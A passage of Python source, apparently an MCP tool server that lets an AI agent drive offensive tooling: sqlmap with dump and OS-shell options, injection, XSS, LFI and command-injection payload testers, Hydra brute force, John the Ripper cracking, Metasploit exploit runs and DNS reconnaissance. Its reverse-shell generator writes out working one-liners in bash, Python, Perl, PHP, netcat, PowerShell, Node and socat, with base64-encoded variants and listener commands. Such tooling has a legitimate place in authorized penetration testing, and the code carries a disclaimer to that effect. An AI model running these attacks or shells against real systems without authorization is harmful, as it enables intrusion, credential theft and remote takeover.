    high = [v for v in vulnerabilities if any(k in str(v.get("description", "")).lower() for k in ["xss", "injection", "bypass", "disclosure"])]
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": target, "output_file": output_file, "execution_time": result["execution_time"],
        "summary": {"total_findings": len(vulnerabilities), "critical": len(critical), "high": len(high)},
        "vulnerabilities": vulnerabilities[:50], "critical_findings": critical, "high_findings": high,
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    progress.update("Complete")
    output = chain_engine.enrich_with_context("nikto_scan", target, output)
    log_tool_execution("nikto_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)

# ============================================================================
# SQL INJECTION TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def sqlmap_scan(
    url: str, data: Optional[str] = None, method: str = "GET", param: Optional[str] = None,
    dbms: Optional[str] = None, level: int = 3, risk: int = 2, technique: str = "BEUSTQ",
    dump: bool = False, tables: bool = False, dbs: bool = False, os_shell: bool = False,
    tamper: Optional[str] = None, output_dir: Optional[str] = None, timeout: int = 1200
) -> str:
    """Advanced SQL injection testing with SQLMap. Techniques: B(oolean), E(rror), U(nion), S(tacked), T(ime), Q(inline)"""
    target = url
    trace, progress, exec_dir = _init_tool_context("sqlmap_scan", target, 5)
    inputs = {"url": url, "data": data, "method": method, "param": param, "dbms": dbms,
              "level": level, "risk": risk, "technique": technique, "dump": dump, "tamper": tamper}
    
    if not output_dir:
        output_dir = os.path.join(exec_dir, "artifacts", f"sqlmap_{generate_timestamp()}")
    os.makedirs(output_dir, exist_ok=True)
    
    progress.update("Building SQLMap command")
    cmd = ["sqlmap", "-u", url, "--batch", "--output-dir", output_dir,
           f"--level={level}", f"--risk={risk}", f"--technique={technique}",
           "--threads=4", "--random-agent"]
    if data: cmd.extend(["--data", data])
    if method.upper() == "POST": cmd.append("--method=POST")
    if param: cmd.extend(["-p", param])
    if dbms: cmd.extend(["--dbms", dbms])
    if tamper: cmd.extend(["--tamper", tamper])
    if dbs: cmd.append("--dbs")
    if tables: cmd.append("--tables")
    if dump: cmd.append("--dump")
    if os_shell: cmd.append("--os-shell")
    
    progress.update("Executing SQLMap scan")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
    
    progress.update("Analyzing injection results")
    vulnerable = False
    injection_points = []
    stdout = result["stdout"].lower()
    vuln_indicators = ["sqlmap identified the following injection point", "injectable", "is vulnerable"]
    for indicator in vuln_indicators:
        if indicator in stdout:
            vulnerable = True
            break
    
    lines = result["stdout"].split('\n')
    current_injection = {}
    for line in lines:
        ls = line.strip()
        if "Parameter:" in line:
            if current_injection: injection_points.append(current_injection)
            current_injection = {"parameter": ls.split("Parameter:")[-1].strip()}
        elif "Type:" in line and current_injection:
            current_injection["type"] = ls.split("Type:")[-1].strip()
        elif "Title:" in line and current_injection:
            current_injection["title"] = ls.split("Title:")[-1].strip()
        elif "Payload:" in line and current_injection:
            current_injection["payload"] = ls.split("Payload:")[-1].strip()
    if current_injection: injection_points.append(current_injection)
    
    dumped_files = []
    if os.path.exists(output_dir):
        for r, d, files in os.walk(output_dir):
            for file in files:
                if file.endswith(('.csv', '.txt', '.dump')):
                    dumped_files.append(os.path.join(r, file))
    
    progress.update("Building report")
    output = {
        "status": "success" if result["success"] else "partial",
        "target": url, "vulnerable": vulnerable, "output_dir": output_dir,
        "execution_time": result["execution_time"],
        "summary": {"is_vulnerable": vulnerable, "injection_points": len(injection_points),
                     "dumped_files": len(dumped_files)},
        "injection_points": injection_points, "dumped_files": dumped_files,
        "raw_output": result["stdout"][:3000],
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    progress.update("Complete")
    output = chain_engine.enrich_with_context("sqlmap_scan", target, output)
    log_tool_execution("sqlmap_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def sql_injection_test(
    url: str, param: str, method: str = "GET", data: Optional[str] = None,
    db_type: str = "generic", custom_payloads: Optional[List[str]] = None, timeout: int = 300
) -> str:
    """Manual SQL injection testing with custom payloads and intelligent detection"""
    target = url
    trace, progress, exec_dir = _init_tool_context("sql_injection_test", target, 4)
    inputs = {"url": url, "param": param, "method": method, "db_type": db_type}
    
    payloads = custom_payloads or PayloadGenerator.sql_injection_payloads(db_type)
    results = []
    vulnerable_payloads = []
    
    progress.update("Testing payloads", f"{len(payloads)} payloads queued")
    for i, payload in enumerate(payloads):
        encoded_payload = urllib.parse.quote(payload)
        if method.upper() == "GET":
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded_payload}"
            cmd = ["curl", "-s", "-k", "--max-time", "15", "-A", "Mozilla/5.0", test_url]
        else:
            test_data = f"{param}={encoded_payload}"
            if data: test_data = f"{data}&{test_data}"
            cmd = ["curl", "-s", "-k", "--max-time", "15", "-X", "POST", "-d", test_data, "-A", "Mozilla/5.0", url]
        
        result = run_command_advanced(cmd, timeout=20)
        response = result["stdout"]
        response_lower = response.lower()
        
        sql_errors = ["sql syntax", "mysql", "sqlite", "postgresql", "oracle", "microsoft sql",
                       "odbc", "syntax error", "unclosed quotation", "sqlstate", "pg_query",
                       "mysql_fetch", "mysqli", "pdo", "database error"]
        success_indicators = ["root:x:0:0", "admin", "password", "username",
                               "table_name", "column_name", "information_schema"]
        
        error_based = any(err in response_lower for err in sql_errors)
        data_leaked = any(ind in response_lower for ind in success_indicators)
        
        test_result = {
            "payload": payload, "response_length": len(response),
            "error_based": error_based, "data_leaked": data_leaked,
            "vulnerable": error_based or data_leaked,
            "confidence": "high" if data_leaked else ("medium" if error_based else "low")
        }
        if test_result["vulnerable"]:
            test_result["response_preview"] = response[:500]
            vulnerable_payloads.append(test_result)
        results.append(test_result)
    
    progress.update("Analysis complete")
    output = {
        "status": "success", "target": url, "parameter": param, "method": method,
        "payloads_tested": len(payloads), "vulnerable": len(vulnerable_payloads) > 0,
        "summary": {"total_tested": len(payloads), "vulnerable_payloads": len(vulnerable_payloads),
                     "error_based": len([r for r in results if r["error_based"]]),
                     "data_leaked": len([r for r in results if r["data_leaked"]])},
        "vulnerable_payloads": vulnerable_payloads, "all_results": results[:20]
    }
    
    progress.update("Complete")
    output = chain_engine.enrich_with_context("sql_injection_test", target, output)
    log_tool_execution("sql_injection_test", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)

# ============================================================================
# XSS, LFI, COMMAND INJECTION TESTING
# ============================================================================

@mcp.tool()
@resolve_references
async def xss_scan(
    url: str, param: str, method: str = "GET", data: Optional[str] = None,
    custom_payloads: Optional[List[str]] = None, timeout: int = 300
) -> str:
    """Cross-Site Scripting (XSS) vulnerability testing with advanced payloads"""
    target = url
    trace, progress, exec_dir = _init_tool_context("xss_scan", target, 3)
    inputs = {"url": url, "param": param, "method": method}
    payloads = custom_payloads or PayloadGenerator.xss_payloads()
    results = []
    vulnerable_payloads = []
    
    progress.update("Testing XSS payloads", f"{len(payloads)} payloads")
    for payload in payloads:
        encoded = urllib.parse.quote(payload)
        if method.upper() == "GET":
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded}"
            cmd = ["curl", "-s", "-k", "--max-time", "10", test_url]
        else:
            td = f"{param}={encoded}"
            if data: td = f"{data}&{td}"
            cmd = ["curl", "-s", "-k", "--max-time", "10", "-X", "POST", "-d", td, url]
        r = run_command_advanced(cmd, timeout=15)
        response = r["stdout"]
        reflected = payload in response or urllib.parse.unquote(encoded) in response
        xss_ind = ["<script", "onerror=", "onload=", "javascript:", "alert(", "document."]
        ind_found = any(i.lower() in response.lower() for i in xss_ind)
        tr = {"payload": payload, "reflected": reflected, "indicator_found": ind_found,
              "vulnerable": reflected and ind_found, "response_length": len(response),
              "confidence": "high" if (reflected and ind_found) else ("medium" if reflected else "low")}
        if tr["vulnerable"]:
            tr["response_preview"] = response[:300]
            vulnerable_payloads.append(tr)
        results.append(tr)
    
    progress.update("Analysis")
    output = {
        "status": "success", "target": url, "parameter": param, "method": method,
        "payloads_tested": len(payloads), "vulnerable": len(vulnerable_payloads) > 0,
        "summary": {"total_tested": len(payloads), "reflected": len([r for r in results if r["reflected"]]),
                     "vulnerable": len(vulnerable_payloads)},
        "vulnerable_payloads": vulnerable_payloads, "all_results": results[:15]
    }
    progress.update("Complete")
    output = chain_engine.enrich_with_context("xss_scan", target, output)
    log_tool_execution("xss_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def lfi_scan(url: str, param: str, custom_payloads: Optional[List[str]] = None, timeout: int = 300) -> str:
    """Local File Inclusion (LFI) testing with encoding bypass techniques"""
    target = url
    trace, progress, exec_dir = _init_tool_context("lfi_scan", target, 3)
    inputs = {"url": url, "param": param}
    payloads = custom_payloads or PayloadGenerator.lfi_payloads()
    results = []
    vulnerable_payloads = []
    file_indicators = {"passwd": ["root:x:0:0", "daemon:", "nobody:"], "hosts": ["127.0.0.1", "localhost"],
                        "shadow": ["root:", "$6$", "$y$"], "config": ["[mysqld]", "DocumentRoot", "DB_PASSWORD"]}
    
    progress.update("Testing LFI payloads", f"{len(payloads)} payloads")
    for payload in payloads:
        test_url = f"{url}{'&' if '?' in url else '?'}{param}={urllib.parse.quote(payload)}"
        cmd = ["curl", "-s", "-k", "--max-time", "10", "-A", "Mozilla/5.0", test_url]
        r = run_command_advanced(cmd, timeout=15)
        response_lower = r["stdout"].lower()
        ftype = None
        found = []
        for ft, inds in file_indicators.items():
            for ind in inds:
                if ind.lower() in response_lower:
                    ftype = ft
                    found.append(ind)
        vuln = len(found) > 0
        tr = {"payload": payload, "vulnerable": vuln, "file_type": ftype, "indicators_found": found,
              "response_length": len(r["stdout"]), "confidence": "high" if len(found) > 1 else ("medium" if vuln else "low")}
        if vuln:
            tr["response_preview"] = r["stdout"][:500]
            vulnerable_payloads.append(tr)
        results.append(tr)
    
    progress.update("Analysis")
    output = {
        "status": "success", "target": url, "parameter": param,
        "payloads_tested": len(payloads), "vulnerable": len(vulnerable_payloads) > 0,
        "summary": {"total_tested": len(payloads), "vulnerable": len(vulnerable_payloads),
                     "file_types_found": list(set(r["file_type"] for r in vulnerable_payloads if r["file_type"]))},
        "vulnerable_payloads": vulnerable_payloads, "all_results": results[:15]
    }
    progress.update("Complete")
    output = chain_engine.enrich_with_context("lfi_scan", target, output)
    log_tool_execution("lfi_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def command_injection_test(
    url: str, param: str, method: str = "GET", data: Optional[str] = None,
    custom_payloads: Optional[List[str]] = None, timeout: int = 300
) -> str:
    """Command injection vulnerability testing with bypass techniques"""
    target = url
    trace, progress, exec_dir = _init_tool_context("command_injection_test", target, 3)
    inputs = {"url": url, "param": param, "method": method}
    payloads = custom_payloads or PayloadGenerator.command_injection_payloads()
    results = []
    vulnerable_payloads = []
    cmd_indicators = {"whoami": ["root", "www-data", "apache", "nginx"],
                       "id": ["uid=", "gid=", "groups="], "uname": ["Linux", "Darwin"],
                       "passwd": ["root:x:0:0"], "ls": ["bin", "etc", "var"]}
    
    progress.update("Testing command injection payloads")
    for payload in payloads:
        encoded = urllib.parse.quote(payload)
        if method.upper() == "GET":
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded}"
            cmd = ["curl", "-s", "-k", "--max-time", "15", test_url]
        else:
            td = f"{param}={encoded}"
            if data: td = f"{data}&{td}"
            cmd = ["curl", "-s", "-k", "--max-time", "15", "-X", "POST", "-d", td, url]
        r = run_command_advanced(cmd, timeout=20)
        response_lower = r["stdout"].lower()
        found = []
        for ct, inds in cmd_indicators.items():
            for ind in inds:
                if ind.lower() in response_lower: found.append(f"{ct}:{ind}")
        vuln = len(found) > 0
        tr = {"payload": payload, "vulnerable": vuln, "indicators_found": found,
              "response_length": len(r["stdout"]),
              "confidence": "high" if len(found) > 1 else ("medium" if vuln else "low")}
        if vuln:
            tr["response_preview"] = r["stdout"][:500]
            vulnerable_payloads.append(tr)
        results.append(tr)
    
    progress.update("Analysis")
    output = {
        "status": "success", "target": url, "parameter": param, "method": method,
        "payloads_tested": len(payloads), "vulnerable": len(vulnerable_payloads) > 0,
        "summary": {"total_tested": len(payloads), "vulnerable": len(vulnerable_payloads)},
        "vulnerable_payloads": vulnerable_payloads, "all_results": results[:15]
    }
    progress.update("Complete")
    output = chain_engine.enrich_with_context("command_injection_test", target, output)
    log_tool_execution("command_injection_test", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)



# ============================================================================
# BRUTE FORCE TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def hydra_attack(
    target: str,
    service: str = "ssh",
    username: str = "",
    username_list: str = "",
    password_list: str = "",
    port: int = 0,
    threads: int = 4,
    timeout: int = 300,
    extra_args: str = ""
) -> str:
    """
    Professional brute force attack using Hydra with forensic tracing.
    Supports: ssh, ftp, http-get, http-post-form, rdp, smb, mysql, vnc, telnet, pop3, imap, smtp.
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout, 600)
    if port > 0:
        port = InputValidator.validate_port(port)
    trace, progress, exec_dir = _init_tool_context("hydra_attack", target, 6)
    inputs = {"target": target, "service": service, "port": port, "threads": threads}

    progress.update("Validating parameters")
    supported = ["ssh", "ftp", "http-get", "http-post-form", "rdp", "smb", "mysql",
                 "vnc", "telnet", "pop3", "imap", "smtp", "snmp", "postgres", "mssql"]
    if service not in supported:
        output = {"status": "error", "message": f"Unsupported service: {service}. Supported: {supported}"}
        log_tool_execution("hydra_attack", target, inputs, output, trace, progress)
        return json.dumps(output, indent=2)

    default_ports = {"ssh": 22, "ftp": 21, "rdp": 3389, "smb": 445, "mysql": 3306,
                     "vnc": 5900, "telnet": 23, "pop3": 110, "imap": 143, "smtp": 25,
                     "snmp": 161, "postgres": 5432, "mssql": 1433, "http-get": 80, "http-post-form": 80}
    if port == 0:
        port = default_ports.get(service, 22)

    progress.update("Building Hydra command")
    cmd = ["hydra", "-t", str(threads), "-s", str(port)]
    if username:
        cmd.extend(["-l", username])
    elif username_list and os.path.exists(username_list):
        cmd.extend(["-L", username_list])
    else:
        cmd.extend(["-l", "admin"])

    if password_list and os.path.exists(password_list):
        cmd.extend(["-P", password_list])
    else:
        default_pw = os.path.join(BASE_DIR, "payloads", "common_passwords.txt")
        if os.path.exists(default_pw):
            cmd.extend(["-P", default_pw])
        else:
            cmd.extend(["-p", "password"])

    cmd.extend(["-o", os.path.join(exec_dir, "hydra_results.txt")])
    if extra_args:
        InputValidator.validate_command_args(extra_args)
        cmd.extend(shlex.split(extra_args))
    cmd.extend([target, service])

    progress.update("Running Hydra attack")
    trace.command(f"hydra {service}://{target}:{port}")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)

    progress.update("Parsing results")
    found_creds = []
    for line in result["stdout"].split("\n"):
        if "host:" in line.lower() and ("login:" in line.lower() or "password:" in line.lower()):
            found_creds.append(line.strip())
        elif re.match(r'^\[\d+\]\[', line):
            found_creds.append(line.strip())

    progress.update("Analysis")
    output = {
        "status": "success", "target": target, "service": service, "port": port,
        "credentials_found": len(found_creds), "credentials": found_creds,
        "raw_output_preview": result["stdout"][:2000],
        "execution_time": result.get("execution_time", 0),
        "severity": "CRITICAL" if found_creds else "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("hydra_attack", target, output)
    log_tool_execution("hydra_attack", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def john_crack(
    hash_value: str = "",
    hash_file: str = "",
    hash_type: str = "auto",
    wordlist: str = "",
    rules: str = "",
    timeout: int = 120
) -> str:
    """
    Password hash cracking with John the Ripper. Supports MD5, SHA1, SHA256, SHA512, NTLM, bcrypt, etc.
    """
    target = hash_value[:32] if hash_value else os.path.basename(hash_file) if hash_file else "unknown"
    trace, progress, exec_dir = _init_tool_context("john_crack", target, 6)
    inputs = {"hash_type": hash_type, "has_hash_value": bool(hash_value), "has_hash_file": bool(hash_file)}

    progress.update("Preparing hash input")
    hash_path = os.path.join(exec_dir, "hashes.txt")
    if hash_value:
        with open(hash_path, "w") as f:
            f.write(hash_value + "\n")
    elif hash_file and os.path.exists(hash_file):
        InputValidator.validate_file_path(hash_file)
        hash_path = hash_file
    else:
        output = {"status": "error", "message": "Provide hash_value or hash_file"}
        log_tool_execution("john_crack", target, inputs, output, trace, progress)
        return json.dumps(output, indent=2)

    progress.update("Building John command")
    cmd = ["john"]
    format_map = {
        "md5": "raw-md5", "sha1": "raw-sha1", "sha256": "raw-sha256",
        "sha512": "raw-sha512", "ntlm": "nt", "bcrypt": "bcrypt",
        "mysql": "mysql-sha1", "mssql": "mssql", "lm": "lm"
    }
    if hash_type != "auto" and hash_type in format_map:
        cmd.extend(["--format=" + format_map[hash_type]])
    if wordlist and os.path.exists(wordlist):
        cmd.extend(["--wordlist=" + wordlist])
    elif os.path.exists("/usr/share/wordlists/rockyou.txt"):
        cmd.extend(["--wordlist=/usr/share/wordlists/rockyou.txt"])
    if rules:
        cmd.extend(["--rules=" + rules])
    cmd.append(hash_path)

    progress.update("Cracking hashes")
    trace.command(f"john --format={hash_type} {hash_path}")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)

    progress.update("Retrieving results")
    show_cmd = ["john", "--show", hash_path]
    show_result = run_command_advanced(show_cmd, timeout=30, trace=trace)

    cracked = []
    for line in show_result["stdout"].split("\n"):
        if ":" in line and not line.startswith("(") and line.strip():
            cracked.append(line.strip())

    progress.update("Analysis")
    output = {
        "status": "success", "hash_type": hash_type,
        "cracked_count": len(cracked), "cracked_passwords": cracked,
        "raw_output_preview": result["stdout"][:1500],
        "show_output": show_result["stdout"][:1500],
        "severity": "CRITICAL" if cracked else "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("john_crack", target, output)
    log_tool_execution("john_crack", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# EXPLOITATION TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def metasploit_exploit(
    target: str,
    exploit_module: str = "",
    payload: str = "",
    lhost: str = "0.0.0.0",
    lport: int = 4444,
    options: str = "",
    timeout: int = 120
) -> str:
    """
    Execute Metasploit Framework exploits with forensic tracing. Generates RC files for reproducibility.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("metasploit_exploit", target, 7)
    inputs = {"target": target, "exploit_module": exploit_module, "payload": payload, "lhost": lhost, "lport": lport}

    progress.update("Checking Metasploit availability")
    msf_check = run_command_advanced(["which", "msfconsole"], timeout=10, trace=trace)
    if msf_check["return_code"] != 0:
        output = {"status": "error", "message": "msfconsole not found. Install Metasploit Framework."}
        log_tool_execution("metasploit_exploit", target, inputs, output, trace, progress)
        return json.dumps(output, indent=2)

    progress.update("Building RC script")
    rc_path = os.path.join(exec_dir, "exploit.rc")
    rc_lines = []
    if exploit_module:
        rc_lines.append(f"use {exploit_module}")
        rc_lines.append(f"set RHOSTS {target}")
        if payload:
            rc_lines.append(f"set PAYLOAD {payload}")
        rc_lines.append(f"set LHOST {lhost}")
        rc_lines.append(f"set LPORT {lport}")
        if options:
            for opt in options.split(","):
                opt = opt.strip()
                if "=" in opt:
                    rc_lines.append(f"set {opt}")
        rc_lines.append("check")
        rc_lines.append("exploit -j -z")
    else:
        rc_lines.append(f"db_nmap -sV {target}")
        rc_lines.append(f"vulns")

    rc_lines.append("exit -y")
    with open(rc_path, "w") as f:
        f.write("\n".join(rc_lines) + "\n")

    progress.update("Executing Metasploit")
    cmd = ["msfconsole", "-q", "-r", rc_path]
    trace.command(f"msfconsole -q -r {rc_path}")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)

    progress.update("Parsing output")
    sessions_found = []
    vulns_found = []
    for line in result["stdout"].split("\n"):
        ll = line.lower()
        if "session" in ll and ("opened" in ll or "created" in ll):
            sessions_found.append(line.strip())
        if "vulnerable" in ll or "exploited" in ll:
            vulns_found.append(line.strip())

    progress.update("Analysis")
    output = {
        "status": "success", "target": target, "exploit_module": exploit_module or "auto-scan",
        "payload": payload, "rc_file": rc_path,
        "sessions_opened": len(sessions_found), "sessions": sessions_found,
        "vulnerabilities_found": vulns_found,
        "raw_output_preview": result["stdout"][:3000],
        "severity": "CRITICAL" if sessions_found else ("HIGH" if vulns_found else "info")
    }

    progress.update("Enrichment")
    output = chain_engine.enrich_with_context("metasploit_exploit", target, output)
    progress.update("Complete")
    log_tool_execution("metasploit_exploit", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def reverse_shell_generator(
    lhost: str,
    lport: int = 4444,
    shell_type: str = "bash",
    encoding: str = "none",
    platform: str = "linux"
) -> str:
    """
    Generate reverse shell payloads for authorized penetration testing.
    Types: bash, python, perl, php, nc, ruby, powershell, java, node, socat, msfvenom.
    """
    target = f"{lhost}:{lport}"
    trace, progress, exec_dir = _init_tool_context("reverse_shell_generator", target, 5)
    inputs = {"lhost": lhost, "lport": lport, "shell_type": shell_type, "encoding": encoding, "platform": platform}

    progress.update("Generating payload")
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_alt": f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "nc_alt": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "powershell": f"powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
        "java": f"Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read line;do $line 2>&5 >&5;done\"}});p.waitFor();",
        "node": f"(function(){{var n=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new n.Socket();c.connect({lport},'{lhost}',function(){{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)}});}})();",
        "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
    }

    progress.update("Applying encoding")
    primary = shells.get(shell_type, shells["bash"])
    encoded_versions = {"raw": primary}
    if encoding == "base64" or encoding == "all":
        b64 = base64.b64encode(primary.encode()).decode()
        encoded_versions["base64"] = f"echo {b64} | base64 -d | bash"
    if encoding == "url" or encoding == "all":
        encoded_versions["url_encoded"] = urllib.parse.quote(primary)
    if encoding == "all":
        encoded_versions["hex"] = primary.encode().hex()

    progress.update("Generating listener command")
    listeners = {
        "nc": f"nc -lvnp {lport}",
        "socat": f"socat file:`tty`,raw,echo=0 tcp-listen:{lport}",
        "msfconsole": f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'"
    }

    progress.update("Building output")
    output = {
        "status": "success", "shell_type": shell_type, "lhost": lhost, "lport": lport,
        "platform": platform, "payload": primary,
        "encoded_versions": encoded_versions,
        "all_shells": {k: v for k, v in shells.items()} if shell_type == "all" else {shell_type: primary},
        "listeners": listeners,
        "disclaimer": "AUTHORIZED TESTING ONLY. Unauthorized access is illegal."
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("reverse_shell_generator", target, output)
    log_tool_execution("reverse_shell_generator", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# DNS & SUBDOMAIN TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def subdomain_enum(
    target: str,
    methods: str = "all",
    wordlist: str = "",
    timeout: int = 180
) -> str:
    """
    Comprehensive subdomain enumeration using multiple methods:
    subfinder, amass, assetfinder, crt.sh, DNS brute force, chain enrichment.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("subdomain_enum", target, 8)
    inputs = {"target": target, "methods": methods}

    all_subdomains = set()
    method_results = {}

    # Method 1: crt.sh (passive, always run)
    progress.update("crt.sh certificate transparency")
    crt_cmd = ["curl", "-s", f"https://crt.sh/?q=%25.{target}&output=json"]
    crt_result = run_command_advanced(crt_cmd, timeout=30, trace=trace)
    crt_subs = set()
    try:
        crt_data = json.loads(crt_result["stdout"])
        for entry in crt_data:
            name = entry.get("name_value", "")
            for s in name.split("\n"):
                s = s.strip().lower()
                if s.endswith(f".{target}") or s == target:
                    crt_subs.add(s)
        all_subdomains.update(crt_subs)
        method_results["crt_sh"] = {"count": len(crt_subs), "subdomains": sorted(crt_subs)[:100]}
    except Exception:
        method_results["crt_sh"] = {"count": 0, "error": "Parse error"}

    # Method 2: subfinder
    if methods in ["all", "subfinder"]:
        progress.update("subfinder enumeration")
        sf_out = os.path.join(exec_dir, "subfinder.txt")
        sf_cmd = ["subfinder", "-d", target, "-silent", "-o", sf_out]
        sf_result = run_command_advanced(sf_cmd, timeout=60, trace=trace)
        sf_subs = set()
        if os.path.exists(sf_out):
            with open(sf_out) as f:
                for line in f:
                    s = line.strip().lower()
                    if s:
                        sf_subs.add(s)
        else:
            for line in sf_result["stdout"].split("\n"):
                s = line.strip().lower()
                if s and target in s:
                    sf_subs.add(s)
        all_subdomains.update(sf_subs)
        method_results["subfinder"] = {"count": len(sf_subs), "subdomains": sorted(sf_subs)[:100]}

    # Method 3: amass
    if methods in ["all", "amass"]:
        progress.update("amass passive enumeration")
        amass_cmd = ["amass", "enum", "-passive", "-d", target, "-timeout", "2"]
        amass_result = run_command_advanced(amass_cmd, timeout=90, trace=trace)
        amass_subs = set()
        for line in amass_result["stdout"].split("\n"):
            s = line.strip().lower()
            if s and target in s:
                amass_subs.add(s)
        all_subdomains.update(amass_subs)
        method_results["amass"] = {"count": len(amass_subs), "subdomains": sorted(amass_subs)[:100]}

    # Method 4: assetfinder
    if methods in ["all", "assetfinder"]:
        progress.update("assetfinder enumeration")
        af_cmd = ["assetfinder", "--subs-only", target]
        af_result = run_command_advanced(af_cmd, timeout=60, trace=trace)
        af_subs = set()
        for line in af_result["stdout"].split("\n"):
            s = line.strip().lower()
            if s and target in s:
                af_subs.add(s)
        all_subdomains.update(af_subs)
        method_results["assetfinder"] = {"count": len(af_subs), "subdomains": sorted(af_subs)[:100]}

    # Method 5: DNS brute force
    if methods in ["all", "brute"]:
        progress.update("DNS brute force")
        common_prefixes = ["www", "mail", "ftp", "admin", "dev", "staging", "test", "api", "app",
                          "portal", "vpn", "ns1", "ns2", "mx", "smtp", "pop", "imap", "blog",
                          "shop", "store", "cdn", "static", "media", "assets", "img", "images",
                          "docs", "wiki", "git", "jenkins", "ci", "cd", "monitor", "grafana",
                          "prometheus", "kibana", "elastic", "redis", "db", "mysql", "postgres",
                          "mongo", "s3", "backup", "internal", "intranet", "extranet", "sso",
                          "auth", "login", "oauth", "webmail", "remote", "cloud", "k8s"]
        dns_subs = set()
        for prefix in common_prefixes:
            subdomain = f"{prefix}.{target}"
            try:
                socket.gethostbyname(subdomain)
                dns_subs.add(subdomain)
            except socket.gaierror:
                pass
        all_subdomains.update(dns_subs)
        method_results["dns_brute"] = {"count": len(dns_subs), "subdomains": sorted(dns_subs)}

    progress.update("Resolving IPs")
    resolved = {}
    for sub in sorted(all_subdomains)[:200]:
        try:
            ip = socket.gethostbyname(sub)
            resolved[sub] = ip
        except Exception:
            resolved[sub] = "unresolved"

    progress.update("Analysis")
    unique_ips = set(v for v in resolved.values() if v != "unresolved")
    output = {
        "status": "success", "target": target,
        "total_unique_subdomains": len(all_subdomains),
        "resolved_count": sum(1 for v in resolved.values() if v != "unresolved"),
        "unique_ips": len(unique_ips),
        "methods_used": method_results,
        "all_subdomains": sorted(all_subdomains)[:300],
        "resolved_map": dict(sorted(resolved.items())[:200]),
        "ip_list": sorted(unique_ips)
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("subdomain_enum", target, output)
    log_tool_execution("subdomain_enum", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def dns_recon(
    target: str,
    record_types: str = "A,AAAA,MX,NS,TXT,SOA,CNAME,SRV,PTR",
    zone_transfer: bool = True,
    timeout: int = 120
) -> str:
    """
    Deep DNS reconnaissance: record enumeration, zone transfer attempts, DNSSEC checks, reverse lookups.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("dns_recon", target, 7)
    inputs = {"target": target, "record_types": record_types, "zone_transfer": zone_transfer}

    dns_results = {}
    progress.update("Querying DNS records")
    for rtype in record_types.split(","):
